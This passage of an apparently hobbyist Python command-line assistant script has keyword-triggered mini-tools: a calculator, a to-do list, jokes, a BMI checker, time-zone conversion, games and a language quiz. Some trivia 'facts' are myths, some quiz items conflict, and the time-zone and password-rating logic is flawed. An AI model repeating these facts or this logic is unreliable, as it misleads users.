        ask1 = int(input("Enter Any Value: "))
        ask2 = int(input("Enter Next Value: "))

        symbol = input(("Enter (+, *, -, /): "))

        if "+" in symbol:
            sum = ask1 + ask2
            print(f"After plus between Value {ask1} and {ask2} is {sum}")

        elif "*" in symbol:
            sum = ask1 * ask2
            print(f"After mutlply between Value {ask1} and {ask2} is {sum}")
            
        elif "-" in symbol:
            sum = ask1 - ask2
            print(f"After subtract between Value {ask1} and {ask2} is {sum}")	
            
        elif "/" in symbol:
            sum = ask1 / ask2
            print(f"After divide between Value {ask1} and {ask2} is {sum}")	
            
        else:
            print("Symbol Not Recognized, Please Enter + or - or / or * ")	
        print("----------------------")
        return "Calculation Done!"
    elif "-tdl" in ui: # To-Do List Program
        import json
        import os

        def save_tasks():
            """Save tasks to a JSON file."""
            try:
                with open("tasks.json", "w") as file:
                    json.dump(tasks, file, indent=4)
            except Exception as e:
                print(f"Error saving tasks: {e}")

        def load_tasks():
            """Load tasks from a JSON file."""
            global tasks
            try:
                if os.path.exists("tasks.json"):
                    with open("tasks.json", "r") as file:
                        tasks = json.load(file)
                else:
                    tasks = []
            except Exception as e:
                print(f"Error loading tasks: {e}")
                tasks = []

        # Function to display tasks
        def view_tasks():
            """Display all tasks."""
            if not tasks:
                print("\nYour to-do list is empty!")
            else:
                print("\nTo-Do List:")
                for i, task in enumerate(tasks, 1):
                    status = "✓" if task["completed"] else "✗"
                    print(f"{i}. {task['task']} [{status}]")

        # Function to add a task
        def add_task():
            """Add a new task."""
            task = input("Enter the task: ").strip()
            if task:
                tasks.append({"task": task, "completed": False})
                save_tasks()  # Save changes immediately
                print("Task added successfully!")

        # Function to mark a task as completed
        def complete_task():
            """Mark a task as completed."""
            view_tasks()
            if tasks:
                try:
                    task_num = int(input("\nEnter task number to mark as completed: "))
                    if 1 <= task_num <= len(tasks):
                        tasks[task_num - 1]["completed"] = True
                        save_tasks()  # Save changes immediately
                        print("Task marked as completed!")
                    else:
                        print("Invalid task number!")
                except ValueError:
                    print("Please enter a valid number!")

        # Function to delete a task
        def delete_task():
            """Delete a task."""
            view_tasks()
            if tasks:
                try:
                    task_num = int(input("\nEnter task number to delete: "))
                    if 1 <= task_num <= len(tasks):
                        removed_task = tasks.pop(task_num - 1)
                        save_tasks()  # Save changes immediately
                        print(f"Task '{removed_task['task']}' deleted!")
                    else:
                        print("Invalid task number!")
                except ValueError:
                    print("Please enter a valid number!")

        # Main menu
        def main_menu():
            """Display the main menu."""
            while True:
                print("--- TO DO LIST MENU ---")
                print("1. View Tasks")
                print("2. Add Task")
                print("3. Mark Task as Completed")
                print("4. Delete Task")
                print("5. Exit")
                
                choice = input("Enter your choice: ").strip()
                
                if choice == "1":
                    view_tasks()
                elif choice == "2":
                    add_task()
                elif choice == "3":
                    complete_task()
                elif choice == "4":
                    delete_task()
                elif choice == "5":
                    print("Exited..")
                    break
                else:
                    print("Invalid choice, please try again.")

        # Run the program
        if __name__ == "__main__":
            load_tasks()  # Load tasks at the start
            main_menu()
            return "Thanks for using To-Do List!"

    elif "-rem" in ui:
        import time
        msg = input("Enter your reminder message: ")
        seconds = int(input("After how many seconds to remind? "))
        print(f"Reminder set for {seconds} seconds.")
        time.sleep(seconds)
        return(f"Reminder - {msg}")

    elif "joke" in ui or "tell me a joke" in ui or "another joke" in ui or "-jk" in ui: #jokes
                    import random
                    jokes = [
                    "Why shouldn\'t you fundraise for marathons? They just take the money and run.",  
                    "Why did the crab cross the road? It didn't it used the sidewalk.",  
                    "Why does it take pirates a long time to learn the alphabet? Because they can spend years at C!",  
                    "Why can't a nose be 12 inches long? Because then it would be a foot.",  
                    "Why can't you put two half-dollars in your pocket? Because two halves make a hole, and your money will fall out!",  
                    "Why does a moon rock taste better than an Earth rock? It's a little meteor.",  
                    "How much do rainbows weigh? Not much. They're actually pretty light.",  
                    "What is the most popular fish in the ocean? The starfish.",  
                    "A slice of apple pie costs $2.50 in Jamaica, $3.75 in Bermuda, and $3 in the Bahamas. Those are the pie-rates of the Caribbean.",  
                    "Why did the football coach yell at the vending machine? He wanted his quarter back!",  
                    "I had a joke about paper today, but it was tearable.",  
                    "What kind of job can you get at a bicycle factory? A spokesperson.",  
                    "What does a condiment wizard perform? Saucery.",  
                    "What's the difference in an alligator and a crocodile? You'll see one later and one in a while.",  
                    "What's the difference between the bird flu and the swine flu? One requires tweetment and the other an oinkment.",  
                    "What's the difference between ducks and dine-and-dashers? Ducks take care of their bills.",  
                    "What's the difference between spring rolls and summer rolls? Their seasoning.",  
                    "What's the difference between Iron Man and Aluminum Man? Iron Man stops the bad guy. Aluminum Man foils their plans.",  
                    "What's the difference between a poorly dressed man on a unicycle and a well-dressed man on a bicycle? Attire.",  
                    "What's the difference between a $20 steak and a $55 steak? February 14th.",  
                    "What's the best thing about Switzerland? The flag is a big plus.",  
                    "I went to the aquarium this weekend, but I didn't stay long. There's something fishy about that place.",  
                    "I found a lion in my closet the other day! When I asked what it was doing there, it said 'Narnia business.'",  
                    "What's a cat's favorite instrument? Purr-cussion.",  
                    "Why did the snail paint a giant S on his car? So when he drove by, people could say: 'Look at that S car go!'",  
                    "What do you call a happy cowboy? A jolly rancher.",  
                    "What subject do cats like best in school? Hiss-tory.",  
                    "Humpty Dumpty had a great fall. He said his summer was pretty good too.",  
                    "My boss said 'dress for the job you want, not for the job you have.' So I went in as Batman.",  
                    "How do you make holy water? You boil the hell out of it.",  
                    "Justice is a dish best served cold. Otherwise, it's just water.",  
                    "Why should you never throw grandpa's false teeth at a vehicle? You might denture car.",  
                    "Why are Christmas trees bad at knitting? They always drop their needles.",  
                    "What did the lunch box say to the refrigerator? Don't hate me because I'm a little cooler.",  
                    "I can always tell when someone is lying. I can tell when they're standing too."]
                    return (random.choice(jokes))
    elif "-bmi" in ui:
        def bmiCalculator():
            try:
                print("------- BMI CHECKER -------")
                weight = float(input("Enter your weight (kg): "))
                height = float(input("Enter your height (cm): "))
                
                # Convert height to meters
                height = height / 100  
                
                # Validate inputs
                if weight <= 0 or height <= 0:
                    print("Weight and height must be positive numbers!")
                    return
                
                bmi = weight / (height ** 2)
                print("---------------------------")
                print(f"Your BMI is {bmi:.2f}")
                
                # BMI Categories
                if bmi < 18.5:
                    print("You are underweight.")
                elif 18.5 <= bmi <= 24.9:
                    print("You have a normal weight.")
                elif 25 <= bmi <= 29.9:
                    print("You are overweight.")
                else:
                    print("You are obese.")
                print("---------------------------")
            except ValueError:
                print("Please enter valid numbers for weight and height!")
        # Example usage
        bmiCalculator()
        return("Done!")

    elif "a cool fact" in ui or "random fact" in ui or "tell me a fact" in ui or "a random fact" in ui or "-fct" in ui or "tell me something" in ui:
            import random
            def get_random_fact():
                facts = [
                                "Honey never spoils; archaeologists have found 3000-year-old honey that's still edible.",
                                "Octopuses have three hearts and blue blood.",
                                "Bananas are berries, but strawberries aren't.",
                                "Sharks existed before trees; they've been around for over 400 million years.",
                                "A day on Venus is longer than a year on Venus.",
                                "Wombat poop is cube-shaped.",
                                "There are more stars in the universe than grains of sand on Earth.",
                                "A group of flamingos is called a 'flamboyance.'",
                                "The Eiffel Tower can grow more than 6 inches in summer due to heat expansion.",
                                "Sloths can hold their breath longer than dolphins—up to 40 minutes.",
                                "Butterflies can taste with their feet.",
                                "The first computer 'bug' was a literal moth stuck in a computer.",
                                "A narwhal's tusk is actually a tooth.",
                                "Avocados are poisonous to birds.",
                                "Koalas' fingerprints are so similar to humans' that they can confuse crime scene investigators.",
                                "Hot water freezes faster than cold water under certain conditions (Mpemba effect).",
                                "The heart of a blue whale is so big, a human could swim through its arteries.",
                                "Carrots were originally purple, not orange.",
                                "Elephants are the only animals that can't jump.",
                                "Humans share about 60% of their DNA with bananas."
                                        ]
                return random.choice(facts)
            return(get_random_fact())

    #Time and date viewer
    elif "time" in ui or "date" in ui or "what's the time" in ui or "what's the today date" in ui or "-tmdt" in ui or "tell me time" in ui or "tell me date" in ui:
                from datetime import datetime, timedelta
                
                india_offset = timedelta(hours=5, minutes=30)
                utc_now = datetime.utcnow()
                print("---------------------------------------------")
                print("Current UTC Time:", utc_now)

            # Adding the India offset to get the IST time
                ist_now = utc_now + india_offset
                print("IST Time:", ist_now)
                print("---------------------------------------------")
                return "Done!"

    elif "-ctz" in ui: #countries time zone
                from datetime import datetime, timedelta
                def get_time_difference(country):
                    time_differences = {
                        'UK': timedelta(hours=0),  # Corrected: GMT+0
                        'USA': timedelta(hours=-5),  # Corrected: GMT-5 (Eastern Time, adjust for other US time zones)
                        'China': timedelta(hours=8),  # Corrected: GMT+8
                        'Japan': timedelta(hours=9),  # Corrected: GMT+9
                        'South Korea': timedelta(hours=9),  # Corrected: GMT+9
                        'Russia': timedelta(hours=3),  # Corrected: Moscow Time, GMT+3
                        'Australia': timedelta(hours=10),  # Corrected: Eastern Australia Time, GMT+10
                        'Taiwan': timedelta(hours=8),  # Corrected: GMT+8
                        'Germany': timedelta(hours=1),  # Added: GMT+1
                        'India': timedelta(hours=5, minutes=30),  # Added: GMT+5:30
                        'Canada': timedelta(hours=-5),  # Added: Eastern Time Zone (other zones can be added similarly)
                        'South Africa': timedelta(hours=2)  # Added: GMT+2
                    }
                    return time_differences.get(country, None)
                def convert_time_to_ist(country):
                    time_difference = get_time_difference(country)
                    if time_difference is None:
                        print(f"Time difference for {country} not found.")
                        return
                    ist_now = datetime.now() + timedelta(hours=5, minutes=30)
                    country_time = ist_now - time_difference
                    print(f"Current time in India (IST): {ist_now.strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"Current time in {country}: {country_time.strftime('%Y-%m-%d %H:%M:%S')}")
                # Main program execution
                print("-----------------------------------")
                print("Supported Countries: \nUK, USA, China, Japan, India, \nRussia, Australia, South Korea, Taiwan, \nGermany, South Africa, Canada")
                print("--------------------------------------------")
                country = input("Enter the country name for seeing timezone: ")
                
                convert_time_to_ist(country)
                print("--------------------------------------------")
                return "Done!"
                
    elif "-rps" in ui or "play with me" in ui or "play game with me" in ui or "play any game with me" in ui: #rock paper scissor
            import random
            def play_game():
                choices = ["rock", "paper", "scissors"]
                computer_choice = random.choice(choices)
                print("------ ROCK PAPER SCISSOR ------")
                print("You can just use R as rock, P as paper, and S as scissors")
                user_choice = input("Choose rock, paper, or scissors: ").lower()

                if user_choice in ['rock', 'r']:
                    user_choice = "rock"
                elif user_choice in ['paper', 'p']:
                    user_choice = "paper"
                elif user_choice in ['scissors', 's']:
                    user_choice = "scissors"
                else:
                    print("Invalid choice. Please select rock, paper, or scissors.")
                    return

                print(f"Computer chose: {computer_choice}")
                print(f"You chose: {user_choice}")

                if user_choice == computer_choice:
                    print("It's a tie!")
                elif (user_choice == "rock" and computer_choice == "scissors") or \
                    (user_choice == "scissors" and computer_choice == "paper") or \
                    (user_choice == "paper" and computer_choice == "rock"):
                    print("You win!") 
                    return "You Won!"
                else:
                    print("You lose!")
                    return "You lose!"

            play_game()       
            print("------------------------------------")
            return "Hope you liked the game!"

    elif "-mp3" in ui:
        try:
            import pygame
            from tkinter import Tk, filedialog

            # Initialize Pygame mixer
            pygame.mixer.init()

            # Function to play music
            def play_music(file_path):
                pygame.mixer.music.load(file_path)
                pygame.mixer.music.play()
                print(f"Playing: {file_path}")

            # File dialog to select music file
            Tk().withdraw()  # Hide the root window
            file_path = filedialog.askopenfilename(filetypes=[("Audio Files", "*.mp3;*.wav")])

            if file_path:
                play_music(file_path)
                input("Press Enter to stop the music...")
                pygame.mixer.music.stop()
            else:
                print("No file selected.")
        except ImportError:
            return "You need to install 'pygame' library. use 'pip install pygame' or 'pip3 install pygame'"
    elif "password strength checker" in ui or "-psc" in ui: #password strength checker
        def check_password_strength(password):
            if len(password) < 8:
                return "Weak"
            elif not re.search("[a-z]", password) or not re.                search("[A-Z]", password):
                return "Moderate"
            elif not re.search("[0-9]", password):
                return "Moderate"
            elif not re.search("[!@#$%^&*()_+]", password):
                return "Strong"
            else:
                return "Very Strong"
        print("------ PASSWORD STRENGTH CHECKER ------")
        password = input("Enter a password to check its strength: ")
        print("Password Strength:", check_password_strength(password))    
        print("---------------------------------------")
        return (f"Your Given Password is {check_password_strength(password)}!")
    elif "-cft" in ui:
                    def convert_temperature(temp, unit):
                        return (temp * 9/5) + 32 if unit == 'C' else (temp - 32) * 5/9

                    print("----- °C/°F TEMP CONVERTER -----")
                    unit = input("Choose (C/F): ").strip().upper()
                    temp = float(input(f"Enter temperature in {unit}: "))
                    converted_temp = convert_temperature(temp, unit)

                    if unit == "C":
                        print("------------------------------")
                        return (f"{temp}°C is = {converted_temp}°F")
                    elif unit == "F":
                        print("------------------------------")
                        return (f"{temp}°F is = {converted_temp}°C")
                    else:
                        return ("Invalid input! Please enter 'C' or 'F'.") 

    elif "tell me a history fact" in ui or "a history fact" in ui or "tell me history fact" in ui or "history fact" in ui:
        import random
        historyfacts = [
            "The shortest war in history lasted for only 38 minutes between Britain and Zanzibar on August 27, 1896.",
            "Great Fire of London (1666): The fire destroyed most of the city but caused surprisingly few deaths.",
            "The Great wall of China is not visible from space without aid.",
            "The first computer virus was created in 1983 and was called the 'Elk Cloner'.",
            "World War I (1914-1918): It was called 'The Great War' before WWII happened."
        ]
        fa = random.choice(historyfacts)
        return(fa)
    elif "-mt" in ui or "-multiplicationtable" in ui: #multiplication table
        print("---------------------------------------------")
        ask = int(input("Enter Digit to get its multiplication table: "))
        num = 1
        while num <= 10:
            print(num*ask)
            num += 1    
        return "Multiplication Table Completed!"    
    elif "-lgg" in ui: #language guesser game
        import random
        print("---- LANGUAGE GUESSING GAME ----")
        print("\n5 Different Languages Words Will Appear!")

        # Dictionary of language texts
        lang_texts = [
            {"text": "Guess the Language: நண்பன்", "options": ["Tamil", "Punjabi", "Telugu", "Sinhala"], "answer": "Tamil"},
            {"text": "Guess the Language: ਦੋਸਤ", "options": ["Hindi", "Bhojpuri", "Punjabi", "Telugu"], "answer": "Punjabi"},
            {"text": "Guess the Language: Дружба", "options": ["Spanish", "German", "French", "Russian"], "answer": "Russian"},
            {"text": "Guess the Language: Amistad", "options": ["German", "English", "Spanish", "Mexican"], "answer": "Spanish"},
            {"text": "Guess the Language: 朋友", "options": ["Chinese", "Japanese", "Korean", "Thai"], "answer": "Chinese"},
            {"text": "Guess the Language: मित्र", "options": ["Hindi", "Gujarati", "Punjabi", "Bengali"], "answer": "Hindi"},
            {"text": "Guess the Language: मित्रता", "options": ["Nepali", "Hindi", "Marathi", "Tamil"], "answer": "Marathi"},
            {"text": "Guess the Language: שלום", "options": ["Hebrew", "Arabic", "Turkish", "Greek"], "answer": "Hebrew"},
            {"text": "Guess the Language: Liebe", "options": ["German", "Dutch", "French", "English"], "answer": "German"},
            {"text": "Guess the Language: دوست", "options": ["Pashto", "Arabic", "Urdu", "Farsi"], "answer": "Urdu"},
            {"text": "Guess the Language: あい", "options": ["Chinese", "Korean", "Japanese", "Vietnamese"], "answer": "Japanese"},
            {"text": "Guess the Language: 사랑", "options": ["Korean", "Japanese", "Chinese", "Thai"], "answer": "Korean"},
            {"text": "Guess the Language: दोस्ती", "options": ["Hindi", "Nepali", "Marathi", "Bhojpuri"], "answer": "Hindi"},
            {"text": "Guess the Language: свобода", "options": ["Bulgarian", "Serbian", "Ukrainian", "Russian"], "answer": "Russian"},
            {"text": "Guess the Language: liberdade", "options": ["Portuguese", "Spanish", "Italian", "French"], "answer": "Portuguese"},
            {"text": "Guess the Language: प्यार", "options": ["Hindi", "Gujarati", "Bengali", "Punjabi"], "answer": "Hindi"},
            {"text": "Guess the Language: शांति", "options": ["Nepali", "Hindi", "Marathi", "Sanskrit"], "answer": "Sanskrit"},
            {"text": "Guess the Language: الحب", "options": ["Arabic", "Urdu", "Pashto", "Farsi"], "answer": "Arabic"},
            {"text": "Guess the Language: 친구", "options": ["Chinese", "Korean", "Japanese", "Thai"], "answer": "Korean"},
            {"text": "Guess the Language: อิสระ", "options": ["Vietnamese", "Thai", "Burmese", "Khmer"], "answer": "Thai"},
            {"text": "Guess the Language: मित्रता", "options": ["Hindi", "Nepali", "Marathi", "Gujarati"], "answer": "Nepali"},
            {"text": "Guess the Language: liefde", "options": ["Dutch", "German", "French", "Afrikaans"], "answer": "Dutch"},
            {"text": "Guess the Language: दोस्त", "options": ["Hindi", "Punjabi", "Gujarati", "Bhojpuri"], "answer": "Bhojpuri"},
            {"text": "Guess the Language: 평화", "options": ["Korean", "Japanese", "Chinese", "Vietnamese"], "answer": "Korean"},
            {"text": "Guess the Language: la paix", "options": ["French", "Spanish", "Portuguese", "Italian"], "answer": "French"},
            {"text": "Guess the Language: حب", "options": ["Farsi", "Arabic", "Urdu", "Pashto"], "answer": "Arabic"},
            {"text": "Guess the Language: ευτυχία", "options": ["Greek", "Turkish", "Latin", "Macedonian"], "answer": "Greek"},
            {"text": "Guess the Language: 快乐", "options": ["Chinese", "Korean", "Japanese", "Thai"], "answer": "Chinese"},
            {"text": "Guess the Language: alegría", "options": ["Spanish", "Portuguese", "Italian", "French"], "answer": "Spanish"},
            {"text": "Guess the Language: دوستي", "options": ["Urdu", "Pashto", "Hindi", "Farsi"], "answer": "Urdu"},
            {"text": "Guess the Language: சுதந்திரம்", "options": ["Tamil", "Malayalam", "Telugu", "Kannada"], "answer": "Tamil"},
            {"text": "Guess the Language: స్వేచ్ఛ", "options": ["Telugu", "Tamil", "Kannada", "Malayalam"], "answer": "Telugu"},
            {"text": "Guess the Language: ఐక్యత", "options": ["Telugu", "Tamil", "Hindi", "Punjabi"], "answer": "Telugu"},
            {"text": "Guess the Language: Единство", "options": ["Russian", "Ukrainian", "Bulgarian", "Polish"], "answer": "Russian"},
            {"text": "Guess the language: pojke", "options": ["German", "Swedish", "Mongolian", "Italian"], "answer": "Swedish"},
            {"text": "Guess the language: déjà vu", "options": ["Italian", "French", "Hebrew", "German"], "answer": "French"},
            {"text": "Guess the language: 気持ち 山手", "options": ["Thai", "Japanese", "Chinese", "Mongolian"], "answer": "Japanese"},
            {"text": "Guess the language: 逃げる", "options": ["Chinese", "Thai", "Japanese", "Malay"], "answer": "Japanese"},
            {"text": "Guess the language: มีชื่อเสียง", "options": ["Telugu", "Punjabi", "Thai", "Chinese"], "answer": "Thai"},
            {"text": "Guess the Language: vän", "options": ["Swedish", "Finnish", "Danish", "Norwegian"], "answer": "Swedish"},
            {"text": "Guess the Language: rauha", "options": ["Finnish", "Estonian", "Norwegian", "Swedish"], "answer": "Finnish"},
            {"text": "Guess the Language: hau'oli", "options": ["Hawaiian", "Tagalog", "Malay", "Maori"], "answer": "Hawaiian"},
            {"text": "Guess the Language: aloha", "options": ["Hawaiian", "Maori", "Malay", "Tagalog"], "answer": "Hawaiian"},
            {"text": "Guess the Language: maitea", "options": ["Basque", "Spanish", "Catalan", "Galician"], "answer": "Basque"},
            {"text": "Guess the Language: ljubav", "options": ["Croatian", "Serbian", "Russian", "Slovak"], "answer": "Croatian"},
            {"text": "Guess the Language: kärlek", "options": ["Swedish", "Norwegian", "Danish", "Finnish"], "answer": "Swedish"},
            {"text": "Guess the Language: lagom", "options": ["Swedish", "Norwegian", "Danish", "Icelandic"], "answer": "Swedish"},
            {"text": "Guess the Language: mahal", "options": ["Tagalog", "Malay", "Indonesian", "Thai"], "answer": "Tagalog"},
            {"text": "Guess the Language: cinta", "options": ["Malay", "Tagalog", "Indonesian", "Thai"], "answer": "Malay"},
            {"text": "Guess the Language: do'st", "options": ["Uzbek", "Kazakh", "Turkmen", "Kyrgyz"], "answer": "Uzbek"},
            {"text": "Guess the Language: hati", "options": ["Malay", "Indonesian", "Tagalog", "Vietnamese"], "answer": "Indonesian"},
            {"text": "Guess the Language: bonheur", "options": ["French", "Italian", "Spanish", "Portuguese"], "answer": "French"},
            {"text": "Guess the Language: saudade", "options": ["Spanish", "Portuguese", "Italian", "French"], "answer": "Portuguese"},
            {"text": "Guess the Language: 행복", "options": ["Korean", "Japanese", "Chinese", "Thai"], "answer": "Korean"},
            {"text": "Guess the Language: 幸福", "options": ["Chinese", "Japanese", "Korean", "Vietnamese"], "answer": "Chinese"},
            {"text": "Guess the Language: chiedo", "options": ["Italian", "French", "Spanish", "Portuguese"], "answer": "Italian"},
            {"text": "Guess the Language: amour", "options": ["French", "Italian", "Spanish", "German"], "answer": "French"},
            {"text": "Guess the Language: liebe", "options": ["German", "Dutch", "Afrikaans", "English"], "answer": "German"},
            {"text": "Guess the Language: স্বাধীনতা", "options": ["Bengali", "Hindi", "Tamil", "Malayalam"], "answer": "Bengali"},
            {"text": "Guess the Language: חבר", "options": ["Arabic", "Hebrew", "Greek", "Turkish"], "answer": "Hebrew"},
            {"text": "Guess the Language: свобода", "options": ["Russian", "Bulgarian", "Ukrainian", "Polish"], "answer": "Russian"},
            {"text": "Guess the Language: arkadaş", "options": ["Turkish", "Arabic", "Farsi", "Hebrew"], "answer": "Turkish"},
            {"text": "Guess the Language: ドラゴン", "options": ["Chinese", "Korean", "Japanese", "Thai"], "answer": "Japanese"},
            {"text": "Guess the Language: дружба", "options": ["Russian", "Bulgarian", "Ukrainian", "Polish"], "answer": "Russian"},
            {"text": "Guess the Language: მეგობრობა", "options": ["Georgian", "Armenian", "Azerbaijani", "Turkish"], "answer": "Georgian"},
            {"text": "Guess the Language: přítel", "options": ["Czech", "Slovak", "Polish", "Hungarian"], "answer": "Czech"},
            {"text": "Guess the Language: φίλη", "options": ["Greek", "Latin", "Hebrew", "Turkish"], "answer": "Greek"},
            {"text": "Guess the Language: sõber", "options": ["Estonian", "Finnish", "Latvian", "Lithuanian"], "answer": "Estonian"},
            {"text": "Guess the Language: prijatelj", "options": ["Croatian", "Serbian", "Slovenian", "Bosnian"], "answer": "Croatian"},
            {"text": "Guess the Language: barát", "options": ["Hungarian", "Romanian", "Polish", "Czech"], "answer": "Hungarian"},
            {"text": "Guess the Language: ystävä", "options": ["Finnish", "Swedish", "Estonian", "Danish"], "answer": "Finnish"},
            {"text": "Guess the Language: rafiki", "options": ["Swahili", "Zulu", "Amharic", "Hausa"], "answer": "Swahili"},
            {"text": "Guess the Language: دوست", "options": ["Persian", "Arabic", "Pashto", "Urdu"], "answer": "Persian"},
        ]

        # Function to handle the guessing game
        def start_game():
            try:
                score = 0
                questions = random.sample(lang_texts, min(5, len(lang_texts)))  # Pick 5 random questions
                for i, question in enumerate(questions, start=1):
                    print("---------------------------------------")
                    print(f"Q{i}. {question['text']}")
                    for idx, option in enumerate(question['options'], start=1):
                        print(f"{idx}. {option}")
                    
                    # Validate user input
                    while True:
                        try:
                            user_choice = int(input("Enter the option number: "))
                            if 1 <= user_choice <= len(question['options']):
                                break
                            else:
                                print("Invalid option. Please choose a valid number.")
                        except ValueError:
                            print("Invalid input. Please enter a number.")

                    selected_option = question['options'][user_choice - 1]
                    if selected_option == question['answer']:
                        print("Correct!")
                        score += 1
                    else:
                        print(f"Wrong! The correct answer was {question['answer']}.")

                print(f"\nYour final score is: {score}/{len(questions)}")
            
            except Exception as e:
                print(f"An unexpected error occurred: {e}")

        # Start the game
        if __name__ == "__main__":
            try:
                start_game()
            except KeyboardInterrupt:
                print("\nGame interrupted. Goodbye!")
        return "Hope you liked playing The Language Guesser!"

    elif "-tfc" in ui:
        while True:
            def convert_24_to_12(hour, minute):
                # Convert from 24-hour format to 12-hour format
                if hour == 0:
                    return f"12:{minute:02d} AM"
                elif hour == 12:
                    return f"12:{minute:02d} PM"
                elif hour < 12:
                    return f"{hour}:{minute:02d} AM"
                else:
                    return f"{hour - 12}:{minute:02d} PM"

            def convert_12_to_24(hour, minute, period):
                # Convert from 12-hour format to 24-hour format
                if period.lower() == "am":
                    if hour == 12:
                        return f"00:{minute:02d}"
                    else:
                        return f"{hour:02d}:{minute:02d}"
                elif period.lower() == "pm":
                    if hour == 12:
                        return f"12:{minute:02d}"
                    else:
                        return f"{hour + 12:02d}:{minute:02d}"
                else:
                    raise ValueError("Invalid period. Use AM or PM.")

            # Function to take user input and convert accordingly
            def time_converter():
                print("Choose the type of conversion:")
                print("1. 24-hour to 12-hour")
                print("2. 12-hour to 24-hour")
                choice = input("Enter 1 or 2: ").strip()

                if choice == "1":
                    # 24-hour to 12-hour conversion
                    time_input = input("Enter time in 24-hour format (HH:MM): ").strip()
                    try:
                        # Validate and split input
                        hour_24, minute_24 = map(int, time_input.split(':'))
                        if hour_24 < 0 or hour_24 > 23 or minute_24 < 0 or minute_24 > 59:
                            raise ValueError("Hour must be between 0-23 and minutes between 0-59.")
                        time_12 = convert_24_to_12(hour_24, minute_24)
                        print(f"Converted time (12-hour format): {time_12}")
                    except ValueError:
                        print("Invalid time format. Please enter time in HH:MM format.")

                elif choice == "2":
                    # 12-hour to 24-hour conversion
                    time_input = input("Enter time in 12-hour format (HH:MM AM/PM): ").strip()
                    try:
                        # Validate and split input
                        if ' ' not in time_input:
                            raise ValueError("Time format must include AM/PM, e.g., 10:30 AM.")
                        time_parts = time_input.split()
                        hour_minute = time_parts[0].split(':')
                        if len(hour_minute) != 2:
                            raise ValueError("Invalid time format. Please enter in HH:MM AM/PM format.")
                        hour_12, minute_12 = map(int, hour_minute)
                        period_12 = time_parts[1].upper()
                        
                        if hour_12 < 1 or hour_12 > 12 or minute_12 < 0 or minute_12 > 59 or period_12 not in ["AM", "PM"]:
                            raise ValueError("Invalid time format. Ensure hour is 1-12, minutes 0-59, and period is AM/PM.")
                        
                        time_24 = convert_12_to_24(hour_12, minute_12, period_12)
                        print(f"Converted time (24-hour format): {time_24}")
                    except ValueError as e:
                        print(f"Error: {e}")
                else:
                    print("Invalid choice. Please enter 1 or 2.")

            # Call the time_converter function
        
            if __name__ == "__main__":
                    time_converter()
            return "Thanks for using Time Format Converter!"

    elif "-age" in ui: #Birth Age 
            from datetime import datetime
            current_year = datetime.now().year
            print("-----------------------------")
            birth_year = int(input("Enter your birth year: "))
            age = current_year - birth_year

            print("-----------------------------")
            if birth_year > current_year:
                return "Birth year cannot be in future!"
            else:
                return (f"You are {age} years old.")  
            
    elif "-vgs" in ui:
            import random

            def suggest_game():
                    # Categories of games with more genres added
                categories = {
                    "Action": [
                        {"game": "Grand Theft Auto V", "platform": "PC, PS4, Xbox One", "system": "Mid-end"},
                        {"game": "DOOM Eternal", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Streets of Rage 4", "platform": "PC, PS4, Xbox One, Switch", "system": "Low-end"},
                        {"game": "Shadow of the Tomb Raider", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Rise of the Tomb Raider", "platform": "PC, PS4, Xbox One", "system": "Mid-end"}
                    ],
                    "Adventure": [
                        {"game": "The Witcher 3", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Tomb Raider (2013)", "platform": "PC, PS3, Xbox 360", "system": "Low-end"},
                        {"game": "Minecraft", "platform": "PC, PS4, Xbox One, Switch", "system": "Low-end"},
                        {"game": "Red Dead Redemption 2", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Red Dead Redemption", "platform": "PS3, Xbox 360", "system": "Low-end"}
                    ],
                    "RPG": [
                        {"game": "Cyberpunk 2077", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Skyrim", "platform": "PC, PS4, Xbox One, Switch", "system": "Low-end"},
                        {"game": "Dark Souls III", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Fallout 4", "platform": "PC, PS4, Xbox One", "system": "Low-end"}
                    ],
                    "FPS": [
                        {"game": "Call of Duty: Modern Warfare", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Battlefield V", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Overwatch", "platform": "PC, PS4, Xbox One", "system": "Low-end"},
                        {"game": "Valorant", "platform": "PC", "system": "Low-end"},
                        {"game": "Apex Legends", "platform": "PC, PS4, Xbox One", "system": "High-end"}
                    ],
                    "Strategy": [
                        {"game": "Sid Meier's Civilization VI", "platform": "PC, PS4, Xbox One", "system": "Low-end"},
                        {"game": "Starcraft II", "platform": "PC", "system": "Low-end"},
                        {"game": "Age of Empires IV", "platform": "PC", "system": "High-end"},
                        {"game": "Command & Conquer Remastered", "platform": "PC", "system": "Low-end"}
                    ],
                    "Sports": [
                        {"game": "FIFA 23", "platform": "PC, PS5, Xbox Series X/S", "system": "High-end"},
                        {"game": "NBA 2K23", "platform": "PC, PS4, PS5, Xbox One, Xbox Series X/S", "system": "High-end"},
                        {"game": "Madden NFL 22", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Rocket League", "platform": "PC, PS4, Xbox One, Switch", "system": "Low-end"},
                        {"game": "Forza Horizon 5", "platform": "PC, Xbox Series X/S", "system": "High-end"},
                        {"game": "Need for Speed Heat", "platform": "PC, PS4, Xbox One", "system": "Mid-end"},
                        {"game": "Mario Kart 8 Deluxe", "platform": "Switch", "system": "Low-end"},
                        {"game": "Asphalt 9: Legends", "platform": "PC, Switch, Mobile", "system": "Low-end"}
                    ],
                    "Horror": [
                        {"game": "Silent Hill 2 (OG)", "platform": "PC, PS2, Xbox", "system": "Low-end"},
                        {"game": "Outlast", "platform": "PC, PS4, Xbox One", "system": "Low-end"},
                        {"game": "Amnesia: The Dark Descent", "platform": "PC, PS4", "system": "Low-end"},
                        {"game": "Dead by Daylight", "platform": "PC, PS4, Xbox One", "system": "Low-end"}
                    ],
                    "Survival Horror": [
                        {"game": "Resident Evil 2 Remake", "platform": "PC, PS4, Xbox One", "system": "High-end"},
                        {"game": "Resident Evil 3 Remake", "platform": "PC, PS4, Xbox One", "system": "Mid-end"},
                        {"game": "Resident Evil 4 Remake", "platform": "PC, PS5, Xbox Series X/S", "system": "High-end"},
                        {"game": "Resident Evil 7", "platform": "PC, PS4, Xbox One", "system": "Mid-end"},
